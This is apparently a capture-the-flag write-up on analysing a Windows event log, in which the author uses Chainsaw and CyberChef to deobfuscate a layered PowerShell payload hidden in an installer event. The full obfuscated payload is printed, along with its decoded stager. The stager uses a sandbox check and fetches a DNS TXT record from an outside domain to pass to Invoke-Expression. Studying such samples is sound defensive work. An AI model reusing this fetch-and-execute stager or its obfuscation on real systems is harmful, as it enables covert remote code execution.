---
title: "Texas chainsaw massacre"
weight: 50
---
## Texas chainsaw massacre

> Ugh! One of our users was trying to install a Texas Chainsaw Massacre video game, and installed malware instead. Our EDR detected a rogue process reading and writing events to the Application event log. Luckily, it killed the process and everything seems fine, but we don't know what it was doing in the event log.
> The EVTX file is attached. Are you able to find anything malicious?





https://github.com/WithSecureLabs/chainsaw

  ```shell
  PS C:\Users\shanna\Downloads\chainsaw> .\chainsaw_x86_64-pc-windows-msvc.exe search texas -i ..\ChainsawMassacre\

  ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
  ██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
  ██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
  ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
      By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

  [+] Loading forensic artefacts from: ..\ChainsawMassacre\
  [+] Loaded 1 forensic files (1.1 MB)
  [+] Searching forensic artefacts...
  ---
  Event:
    EventData:
      Binary: null
      Data:
      - CN=SSL.com Root Certification Authority RSA, O=SSL Corporation, L=Houston, S=Texas, C=US
      - B7AB3308D1EA4477BA1480125A6FBDA936490CBB
    System:
      Channel: Application
      Computer: DESKTOP-JU2PNRI
      Correlation: null
      EventID: 4097
      EventID_attributes:
        Qualifiers: 0
      EventRecordID: 1774
      Execution_attributes:
        ProcessID: 1132
        ThreadID: 8360
      Keywords: '0x8080000000000000'
      Level: 4
      Opcode: 0
      Provider_attributes:
        EventSourceName: Microsoft-Windows-CAPI2
        Guid: '{5bbca4a8-b209-48dc-a8c7-b23d3e5216fb}'
        Name: Microsoft-Windows-CAPI2
      Security: null
      Task: 0
      TimeCreated_attributes:
        SystemTime: 2023-10-10T15:59:24.350295Z
      Version: 0
  Event_attributes:
    xmlns: http://schemas.microsoft.com/win/2004/08/events/event

  ---
  Event:
    EventData:
      Binary: 2828272E2028205A5436454E763A436F4D537045635B342C32342C272B2732355D2D6A6F696E687836687836292820613654205A543628205365742D7661726961426C65206878364F665368783620687836687836296136542B2028205B537472694E67272B275D205B72454765585D3A3A6D41746368655328206136542029293432315D524168435B2C687836664B496878366543414C5065522D202039335D524168435B2C2938395D524168435B2B38345D524168435B2B39385D524168435B28204563616C506552432D202036335D524168435B2C6878366B776C6878364563616C506552432D20202968783629626878362B68783630596230596878362B6878366E694F6A2D5D35322C6878362B68783634322C6878362B272B27687836345B63656878362B687836706878362B687836534D6F433A566E6878362B687836656B776C2028206878362B6878362E20664B4920292028446E454F5444416878362B687836656878362B687836722E297D2029206878362B272B2768783669696373413A6878362B6878363A5D476E69644F634E6878362B687836652E6878362B687836546878362B6878367865746878362B6878362E6878362B6878364D45547379735B6878362B687836202C5F6B776878362B68272B2778366C20285245446878362B6878364165526D61657274532E6F272B27496878362B68783620746878362B68783643687836272B272B687836656A624F2D5768272B2778362B687836456E207B2048436145526F466878362B687836664B49292073534552704D272B276F43656878362B6878272B2736646878362B6878363A3A6878362B6878365D272B2765644F4D6878362B687836272B276E4F6973534572504D6F636878362B6878362E4E6F49535365726878362B687836704D4F632E6F695B2C20292062272B2730596878362B6878363D3D7744794434702B53272B27732F6C2F6878362B687836692B35477461744A4B79664E6A4F6878362B272B27687836336878362B687836336878362B68783634566878362B687836766A36775279525865317879317042306878362B6878364158564C4D674F77596878362B6878362F2F6878362B687836576F6D6878362B6878367A272B277A556878362B68783674426878362B68783673782F69653072565A376878362B68783678634C696F77574D4745566A6B374A4D6678566D75737A6878362B6878364F5433586B4B753954764F73726878362B68783662626878362B68783663626878362B68783647795A36632F67596878362B6878364E70696C6878362B687836424B3778356878362B687836506C636878362B687836387155794F6842596878362B6878365665636A4E4C573432596A4D38537774416878362B687836615238496878362B6878364F6878362B687836776878362B6878366D6878362B687836366878362B6878365577574E6D577A4377272B276878362B6878365672536878362B6878367237496878362B68783654326878362B6878366B364D6A314D756878362B6878364B6878362B68783654272B272F6F526878362B6878364F35424B4B3852334E68446878362B6878366F6D32416878362B6878364759706878362B68783679616878362B68783654614E673844416E654E6F65536A6878362B68272B27783675676B5442465463435061534830516A704679776878362B272B276878366151796878272B27362B6878364874505547272B276878272B27362B687836444C30424B336878362B68272B2778366C436C724841766878362B68272B27783634474F70564B6878362B687836554E6878362B6878366D477A494465726145766C7063272B276B433945476878362B6878366749616639366A536D53687836272B272B6878364D686878362B687836686878362B68783652664937326878362B6878366F487A556B44735A6F54356878362B6878366E6878362B68783663374D44385733315871272B274B6878362B68783664346462746878362B6878366274683152645369674561456878362B6878364A4E45524D4C557856272B276878362B6878364D4534504A74556878362B6878367453494A555A665A6878362B68783645456878362B687836416878362B6878364A735464445A4E626878362B687836305928676E69525453346878362B68783636657368272B2778362B68783661426D6F52463A3A5D745265766E4F6878362B687836435B5D4D416572747359724F6D654D2E4F692E6D45545359735B20284D6145726878362B687836746878362B687836734574414C6665442E4E4F6878362B687836497353272B276572506D6F272B27632E4F492E6D656878362B68783654735953687836272B272B687836206878362B687836207443656A624F2D57456878362B6878366E2028206878362828286E6F272B2749737365527058272B27652D656B6F766E69206136542C6878362E6878362C6878365269676874546F4C454674687836202920525963666F72456163687B5A54365F207D292B613654205A543628207356206878366F4673687836206878362068783629613654202920272920202D635245704C41434520285B634841725D39302B5B634841725D38342B5B634841725D3534292C5B634841725D3336202D7245506C41636527613654272C5B634841725D333420202D7245506C416365202027525963272C5B634841725D313234202D635245704C4143452020285B634841725D3130342B5B634841725D3132302B5B634841725D3534292C5B634841725D333929207C2E20282024764552626F5345707265466552656E43652E744F537472494E4728295B312C335D2B2778272D4A4F696E272729
      Data:
      - 'Windows Installer installed the product. Product Name: The Texas Chain Saw Massacre (1974). Product Version: 8.0.382.5. Product Language: English. Director: Tobe Hooper. Installation success or error status: 0.'
    System:
      Channel: Application
      Computer: DESKTOP-JU2PNRI
      Correlation: null
      EventID: 1337
      EventID_attributes:
        Qualifiers: 0
      EventRecordID: 1785
      Execution_attributes:
        ProcessID: 9488
        ThreadID: 0
      Keywords: '0x80000000000000'
      Level: 4
      Opcode: 0
      Provider_attributes:
        Name: MsiInstaller
      Security: null
      Task: 0
      TimeCreated_attributes:
        SystemTime: 2023-10-10T16:02:47.088023Z
      Version: 0
  Event_attributes:
    xmlns: http://schemas.microsoft.com/win/2004/08/events/event

  [+] Found 2 hits
  ```
Now we have a binary data string, lets pop it into CyberChef "From Hex" to get the following output:

  ```shell
  (('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
  ```
* A few creplace and replace functions that I'll convert first up. `creplace` is case sensitive while `replace` is not.

  ```shell
  -creplace ([char]90+[char]84+[char]54),[char]36
  -replace'a6t',[char]34
  -replace 'ryc',[char]124
  -creplace ([char]104+[char]120+[char]54),[char]39)
  ```
  * I used an ascii table to do the conversion:
    * ZT6 = $
    * a6t = "
    * ryc = |
    * hx6 = '

So at this point I'm going to drop all this into CyberChef (see below for the recipe).

So I have my output, and I've carriage returned before the pipes just to be easier to read. I'm swapping the output for input in CyberChef at this point and clearing the recipe.

  ```shell
  (('. ( $ENv:CoMSpEc[4,24,25]-join'')( = $( Set-variaBle 'OfS' '')=+ ( [StriNg] [rEGeX]::mAtcheS( = ))421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,'kwl'EcalPeRC-  )')b0Yb0YniOj-]52,42,+''4[cepSMoC:Vnekwl ( . fKI ) (DnEOTDAer.)} ) +''iicsA::]GnidOcNe.Txet.METsys[ ,_kw'+'l (REDAeRmaertS.oI tC'+'ejbO-W'+'En { HCaERoFfKI) sSERpMoCe'+'d::]edOMnOisSErPMoc.NoISSerpMOc.oi[, ) b0Y==wDyD4p+Ss/l/i+5GtatJKyfNjO+''334Vvj6wRyRXe1xy1pB0AXVLMgOwY//WomzzUtBsx/ie0rVZ7xcLiowWMGEVjk7JMfxVmuszOT3XkKu9TvOsrbbcbGyZ6c/gYNpilBK7x5Plc8qUyOhBYVecjNLW42YjM8SwtAaR8IOwm6UwWNmWzCwVrSr7IT2k6Mj1MuKT/oRO5BKK8R3NhDom2AGYpyaTaNg8DAneNoeSj'+'ugkTBFTcCPaSH0QjpFyw+''aQy'+'HtPUG'+'DL0BK3'+'lClrHAv'+'4GOpVKUNmGzIDeraEvlpckC9EGgIaf96jSmS'+'MhhRfI72oHzUkDsZoT5nc7MD8W31XqKd4dbtbth1RdSigEaEJNERMLUxVME4PJtUtSIJUZfZEEAJsTdDZNb0Y(gniRTS46es'+'aBmoRF::]tRevnOC[]MAertsYrOmeM.Oi.mETSYs[ (MaErtsEtALfeD.NOIsSerPmoc.OI.meTsYS'+'  tCejbO-WEn ( '(((noIsseRpXe-ekovni =,'.','RightToLEFt' ) 

  |forEach{$_ })+= $( sV 'oFs' ' ')= ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'=',[cHAr]34  -rEPlAce  |,[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) 

  |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
  ```

Next step is the fact that the command is written (and being read) from right to left. I'll pull out the code to be reversed into CyberChef input by itself:

  ```shell
  (('. Invoke-Expression ( " $( Set-variaBle 'OfS' '')"+ ( [StriNg'+'] [rEGeX]::mAtcheS( " ))

  421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,'kwl'EcalPeRC-  )')b'+'0Yb0Y'+'niOj-]52,'+'42,'+'+''4[ce'+'p'+'SMoC:Vn'+'ekwl ( '+'. fKI ) (DnEOTDA'+'e'+'r.)} ) '+'+''iicsA:'+':]GnidOcN'+'e.'+'T'+'xet'+'.'+'METsys['+' ,_kw'+h'+'x6l (RED'+'AeRmaertS.o'+'I'+' t'+'C''+'+'ejbO-Wh'+'x6+'En { HCaERoF'+'fKI) sSERpM'+'oCe'+hx'+'6d'+'::'+']'+'edOM'+''+'nOisSErPMoc'+'.NoISSer'+'pMOc.oi[, ) b'+'0Y'+'==wDyD4p+S'+'s/l/'+'i+5GtatJKyfNjO'+'+''3'+'3'+'4V'+'vj6wRyRXe1xy1pB0'+'AXVLMgOwY'+'//'+'Wom'+'z'+'zU'+'tB'+'sx/ie0rVZ7'+'xcLiowWMGEVjk7JMfxVmusz'+'OT3XkKu9TvOsr'+'bb'+'cb'+'GyZ6c/gY'+'Npil'+'BK7x5'+'Plc'+'8qUyOhBY'+'VecjNLW42YjM8SwtA'+'aR8I'+'O'+'w'+'m'+'6'+'UwWNmWzCw'+''+'VrS'+'r7I'+'T2'+'k6Mj1Mu'+'K'+'T'+'/oR'+'O5BKK8R3NhD'+'om2A'+'GYp'+'ya'+'TaNg8DAneNoeSj'+h'+'x6ugkTBFTcCPaSH0QjpFyw'+'+''aQyhx'+'6+'HtPUG'+'hx'+'6+'DL0BK3'+h'+'x6lClrHAv'+h'+'x64GOpVK'+'UN'+'mGzIDeraEvlpc'+'kC9EG'+'gIaf96jSmS''+'+'Mh'+'h'+'RfI72'+'oHzUkDsZoT5'+'n'+'c7MD8W31Xq'+'K'+'d4dbt'+'bth1RdSigEaE'+'JNERMLUxV'+''+'ME4PJtU'+'tSIJUZfZ'+'EE'+'A'+'JsTdDZNb'+'0Y(gniRTS4'+'6esh'+'x6+'aBmoRF::]tRevnO'+'C[]MAertsYrOmeM.Oi.mETSYs[ (MaEr'+'t'+'sEtALfeD.NO'+'IsS'+'erPmo'+'c.OI.me'+'TsYS''+'+' '+' tCejbO-WE'+'n 

  ( '(((no'+'IsseRpX'+'e-ekovni ",'.','RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'"',[cHAr]34  -rEPlAce  '|',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |.Invoke-Expression
  ```

As well as reverse, I see that the code now has some more replace functions
  ```
  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 
  -rEPlAce'"',[cHAr]34  
  -rEPlAce  '|',[cHAr]124
  -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39)
  ```
    *  ZT6 = $
    *  '"' = "
    *  '|' = |
    *  hx6 = '

and then

  ```
  -creplace'lwk',[char]36
  -creplace ([char]89+[char]48+[char]98),[char]39  
  -replace'ikf',[char]124
  ```
    * lwk = $
    * Y0b = '
    * ikf = |

From here I *think* this bit `DER( l6x'+'h+'wk_, '+'[sysTEM'+'.'+'tex'+'T'+'.e'+'NcOdinG]:'+':Ascii''+'+' )` means that its got added '+' throughout. So I'll add that to the recipe to remove.

Some more replacing:
  ```shell
  -creplace'$',[char]36  
  -creplace ([char]89+[char]48+[char]98),[char]39
  -replace'|',[char]124
  ```
    * '$' = $
    * Y0b = '
    * '|' = |

The output is now looking much easier to read but we aren't there yet.
  ```shell
  nEW-ObjeCt  +''SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBa'+6xhse64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhM+''SmSj69faIgGE9CkcplvEareDIzGmNUKVpOG46xh+'vAHrlCl6xh+'3KB0LD'+6xhGUPtH'+6xhyQa'+'wyFpjQ0HSaPCcTFBTkgu6xh+'jSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433'+'OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::d6xh+'eCoMpRESs )|FoREaCH { nE'+6xhW-Obje+''Ct Io.StreamReADER( l6xh+'wk_, [sysTEM.texT.eNcOdinG]::Ascii'+' ) }).reADTOEnD( ) | . ( $enV:CoMSpec[4'+',24,25]-jOin'')')
  ```

Now it looks like `6hx` doesn't belong. Neither does `'+` or `+'`

* Some google told me that:
  * `$ENv:CoMSpEc[4,24,'+'25]-join''` = Invoke-Expression
  * `( $verbosepreference.tostring()[1,3]+'x'-join'')` = Invoke-Expression

> The Invoke-Expression cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command. Without Invoke-Expression, a string submitted at the command line is returned (echoed) unchanged.
>
> The two commands are equivalent. The first uses the Command parameter to specify the command to run. The second uses a pipeline operator (|) to send the command string to Invoke-Expression.

My CyberChef recipe Part 2 brings me to this:

  ```shell
  FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhM'SmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQa'wyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433'OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )
  ```

I need to decode from base64 and inflate (Part 3) leaving me with this.
  ```PowerShell
  try {$TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; if ($error.Count -eq 0) { $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
  ```

Pulling out some commands and some PowerShell manipulation gets me the flag:

  ```PowerShell
  PS C:\Users\frenz> $5GMLW = (Resolve-DnsName eventlog.zip -Type txt) | ForEach-Object { $_.Strings }; if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) }
  Start-Process "https://youtu.be/561nnd9Ebss?t=16"
  #flag{409537347c2fae01ef9826c2506ac660}#
  ```

## CyberChef Recipe
These recipes can be used directly in CyberChef by copying and pasting into the text field.

Part 1: Replacing
  ```
  Find_/_Replace({'option':'Simple string','string':'ZT6'},'$',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'a6T'},'=',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'RYc'},'|',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'hx6'},'\'',true,false,true,false)
  ```
Then replace input with output.

Part 2: Reversing and replacing
  ```
  Reverse('Character')
  Find_/_Replace({'option':'Simple string','string':'ZT6'},'$',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'\'"\''},'"',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'\'|\''},'|',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'lwk'},'$',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'Y0b'},'\'',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'IKf'},'|',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'\'+\''},'',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'\'$\''},'$',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'Y0b'},'\'',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'\'|\''},'|',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'6xh'},'',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'\'+'},'',true,false,true,false)
  Find_/_Replace({'option':'Simple string','string':'+\''},'',true,false,true,false)
  ```

Part 3: Decoding and inflating
  ```
  From_Base64('A-Za-z0-9+/=',true,false)
  Raw_Inflate(0,0,'Adaptive',false,false)
  ```

## Reversing the text using PowerShell
  ```PowerShell
  PS C:\Users\shanna\Downloads\chainsaw> $string = "421]rahc[,'fki'ecalper-  93]rahc[,)89]rahc[+84]rahc[+98]rahc[( ecalperc-  63]rahc[,'kwl'ecalperc-  )')b'+'0yb0y'+'nioj-]52,'+'42,'+'+''4[ce'+'p'+'smoc:vn'+'ekwl ( '+'. fki ) (dneotda'+'e'+'r.)} ) '+'+''iicsa:'+':]gnidocn'+'e.'+'t'+'xet'+'.'+'metsys['+' ,_kw'+h'+'x6l (red'+'aermaerts.o'+'i'+' t'+'c''+'+'ejbo-wh'+'x6+'en { hcaerof'+'fki) sserpm'+'oce'+hx'+'6d'+'::'+']'+'edom'+''+'noisserpmoc'+'.noisser'+'pmoc.oi[, ) b'+'0y'+'==wdyd4p+s'+'s/l/'+'i+5gtatjkyfnjo'+'+''3'+'3'+'4v'+'vj6wryrxe1xy1pb0'+'axvlmgowy'+'//'+'wom'+'z'+'zu'+'tb'+'sx/ie0rvz7'+'xcliowwmgevjk7jmfxvmusz'+'ot3xkku9tvosr'+'bb'+'cb'+'gyz6c/gy'+'npil'+'bk7x5'+'plc'+'8quyohby'+'vecjnlw42yjm8swta'+'ar8i'+'o'+'w'+'m'+'6'+'uwwnmwzcw'+''+'vrs'+'r7i'+'t2'+'k6mj1mu'+'k'+'t'+'/or'+'o5bkk8r3nhd'+'om2a'+'gyp'+'ya'+'tang8danenoesj'+h'+'x6ugktbftccpash0qjpfyw'+'+''aqyhx'+'6+'htpug'+'hx'+'6+'dl0bk3'+h'+'x6lclrhav'+h'+'x64gopvk'+'un'+'mgzideraevlpc'+'kc9eg'+'giaf96jsms''+'+'mh'+'h'+'rfi72'+'ohzukdszot5'+'n'+'c7md8w31xq'+'k'+'d4dbt'+'bth1rdsigeae'+'jnermluxv'+''+'me4pjtu'+'tsijuzfz'+'ee'+'a'+'jstddznb'+'0y(gnirts4'+'6esh'+'x6+'abmorf::]trevno'+'c[]maertsyromem.oi.metsys[ (maer'+'t'+'setalfed.no'+'iss'+'erpmo'+'c.oi.me'+'tsys''+'+' '+' tcejbo-we'+'n ( '(((no'+'isserpx'+'e-ekovni"
  PS C:\Users\shanna\Downloads\chainsaw> $arr = $string -split ""
  PS C:\Users\shanna\Downloads\chainsaw> [array]::Reverse($arr)
  PS C:\Users\shanna\Downloads\chainsaw> $arr -join ''
  invoke-e'+'xpressi'+'on(((' ( n'+'ew-object '+' '+'+''syst'+'em.io.c'+'ompre'+'ssi'+'on.deflates'+'t'+'ream( [system.io.memorystream][c'+'onvert]::fromba'+6x'+'hse6'+'4string(y0'+'bnzddtsj'+'a'+'ee'+'zfzujist'+'utjp4em'+''+'vxulmrenj'+'eaegisdr1htb'+'tbd4d'+'k'+'qx13w8dm7c'+'n'+'5tozsdkuzho'+'27ifr'+'h'+'hm'+'+''smsj69faig'+'ge9ck'+'cplvearedizgm'+'nu'+'kvpog46x'+'h+'vahrlcl6x'+'h+'3kb0ld'+6'+'xh'+'gupth'+6'+'xhyqa''+'+'wyfpjq0hsapcctfbtkgu6x'+'h+'jseonenad8gnat'+'ay'+'pyg'+'a2mo'+'dhn3r8kkb5o'+'ro/'+'t'+'k'+'um1jm6k'+'2t'+'i7r'+'srv'+''+'wczwmnwwu'+'6'+'m'+'w'+'o'+'i8ra'+'atws8mjy24wlnjcev'+'ybhoyuq8'+'clp'+'5x7kb'+'lipn'+'yg/c6zyg'+'bc'+'bb'+'rsovt9ukkx3to'+'zsumvxfmj7kjvegmwwoilcx'+'7zvr0ei/xs'+'bt'+'uz'+'z'+'mow'+'//'+'ywogmlvxa'+'0bp1yx1exryrw6jv'+'v4'+'3'+'3''+'+'ojnfykjtatg5+i'+'/l/s'+'s+p4dydw=='+'y0'+'b ) ,[io.comp'+'ression.'+'compression'+''+'mode'+']'+'::'+'d6'+'xh+'eco'+'mpress )ikf'+'foreach { ne'+6x'+'hw-obje'+'+''c'+'t '+'i'+'o.streamrea'+'der( l6x'+'h+'wk_, '+'[system'+'.'+'tex'+'t'+'.e'+'ncoding]:'+':ascii''+'+' ) }).r'+'e'+'adtoend( ) ikf .'+' ( lwke'+'nv:coms'+'p'+'ec[4''+'+',24'+',25]-join'+'y0by0'+'b)')  -creplace'lwk',[char]36  -creplace ([char]89+[char]48+[char]98),[char]39  -replace'ikf',[char]124
  ```


# Resources:
* https://www.ascii-code.com/
* https://github.com/SigmaHQ/sigma/issues/1009
* https://learn-powershell.net/2012/08/12/reversing-a-string-using-powershell/
* https://www.sentinelone.com/blog/deconstructing-powershell-obfuscation-in-malspam-campaigns/
* https://hatching.io/blog/powershell-analysis/
* https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.3